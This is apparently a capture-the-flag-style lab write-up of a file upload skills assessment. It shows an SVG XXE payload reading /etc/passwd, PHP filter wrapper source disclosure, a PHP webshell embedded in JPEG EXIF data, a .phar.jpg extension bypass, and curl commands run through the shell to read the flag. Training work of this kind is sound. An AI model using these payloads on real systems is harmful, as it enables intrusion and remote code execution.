**Skills Assessment - File Upload Attacks

---

You are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.

Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.


Q1. Try to exploit the upload form to read the flag found at the root directory "/".


![](Attachments/Pasted%20image%2020260922105038.png)

```
this contact form has the file upload feature but it has a client side validation which only allows image files.

So I used burp to intercept and modify the extension, easily escaped the clientside validation.


```

![](Attachments/Pasted%20image%2020260922105820.png)

```
i crafted a post request to the endpoint which i found from the source code,

function checkFile(File) {
  var file = File.files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();

  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#upload_message').text("Only images are allowed");
    File.form.reset();
  } else {
    $("#inputGroupFile01").text(filename);
  }
}

$(document).ready(function () {
  $("#upload").click(function (event) {
    event.preventDefault();
    var fd = new FormData();
    var files = $('#uploadFile')[0].files[0];
    fd.append('uploadFile', files);

    if (!files) {
      $('#upload_message').text("Please select a file");
    } else {
      $.ajax({
        url: '/contact/upload.php',
        type: 'post',
        data: fd,
        contentType: false,
        processData: false,
        success: function (response) {
          if (response.trim() != '') {
            $("#upload_message").html(response);
          } else {
            window.location.reload();
          }
        },
      });
    }
  });
});

```

```
also tried the content-type to svg for making it accept the content type, already i knew that the extensions was only having a client side validation.

And then we tried to read the the file using svg-xxe

i was successful.


```

```
POST /contact/upload.php HTTP/1.1
Host: 154.57.164.82:32243
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123
Content-Length: 289

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="uploadFile"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

------WebKitFormBoundaryABC123--
```

![](Attachments/Pasted%20image%2020260922105720.png)


```
Now I want to read the upload.php somehow maybe i can read using the php filter wrapper, that is necessary to know where is file is uploading and also to find some leads.


```

![](Attachments/Pasted%20image%2020260922110533.png)

```
Now we know we can use php filter wrapper to read the php files we will try to read the upload.php

```
![](Attachments/Pasted%20image%2020260922110818.png)

```
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}

```


```
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);

This line is important it shows whats the tmp file name will be and also the code reveals the upload folder.

./user_feedback_submissions/260922_test.svg


test.phar.jpg
      │
      ├── blacklist → doesn't match
      │
      └── whitelist → ends in .jpg → matches
      
      
      something like this works so we now have to upload the file which the php webshell code in the jpg file and access it using the folder which we found.
      
      
      
      
      
```



```
 cp /usr/share/wallpapers/KaliFerrofluid/contents/images/3840x2160.jpg HTB.jpg
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/file_uploads]
└─$ ls         
HTB.jpg  new.svg  shell.php  test.svg
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/file_uploads]
└─$ exiftool -Comment='<?php system($_GET["cmd"]); ?>' HTB.jpg                   
    1 image files updated
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/file_uploads]
└─$ exiftool HTB.jpg                                                             
ExifTool Version Number         : 13.55
File Name                       : HTB.jpg
Directory                       : .
File Size                       : 715 kB
File Modification Date/Time     : 2026:09:22 11:30:12+05:30
File Access Date/Time           : 2026:09:22 11:30:12+05:30
File Inode Change Date/Time     : 2026:09:22 11:30:12+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Comment                         : <?php system($_GET["cmd"]); ?>
Image Width                     : 3840
Image Height                    : 2160
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 3840x2160
Megapixels                      : 8.3
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/file_uploads]
└─$ ls          
HTB.jpg  HTB.jpg_original  new.svg  shell.php  test.svg
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/file_uploads]
└─$ cp HTB.jpg HTB.phar.jpg                                                      


I created a added the php webshell code in the comments using exiftool and you can see the updated version finally for the php parser to execute the file i also added the .phar extension which is allowed.


```

```
These are the important things you much watch for, while doing this assessment we cant upload any file.

file size :

file extension :

file content type :

file uploads folder :

┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/file_uploads]
└─$ python3 -c 'from PIL import Image; im=Image.open("HTB.jpg"); im.thumbnail((800,800)); im.save("small.jpg", quality=50, optimize=True)'
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/file_uploads]
└─$ ls
HTB.jpg  HTB.jpg_original  new.svg  shell.phar.jpg  shell.php  small.jpg  test.svg
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/file_uploads]
└─$ exiftool -Comment='<?php system($_GET["cmd"]); ?>' small.jpg
    1 image files updated
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/file_uploads]
└─$ cp small.jpg small.phar.jpg                                            
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/file_uploads]
└─$ ls
HTB.jpg           new.svg         shell.php  small.jpg_original  test.svg
HTB.jpg_original  shell.phar.jpg  small.jpg  small.phar.jpg
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/file_uploads]
└─$ curl http://154.57.164.72:31088/contact/user_feedback_submissions/260922_small.phar.jpg?cmd=ls
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to 
Warning: your terminal anyway, or consider "--output <FILE>" to save to a file.

```

![](Attachments/Pasted%20image%2020260922124121.png)

![](Attachments/Pasted%20image%2020260922124216.png)

```
interesting part is there is also upload and submit feature so we have to browse the file and then also we have to click the upload option, this is crucial for finding the right post req.

also unlike webapps which we normally see it wont upload along with the browsing, finally we can to click submit if we are trying to submit directly after browsing the file it show successful but file never gets uploaded.


```

![](Attachments/Pasted%20image%2020260922125213.png)

```
http://154.57.164.72:31088/contact/user_feedback_submissions/260922_small.phar.jpg?cmd=php+-r+%27echo+base64_encode(file_get_contents(%22/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt%22));%27
```

this is also a tricky part so think outside of the box.

![](Attachments/Pasted%20image%2020260922125336.png)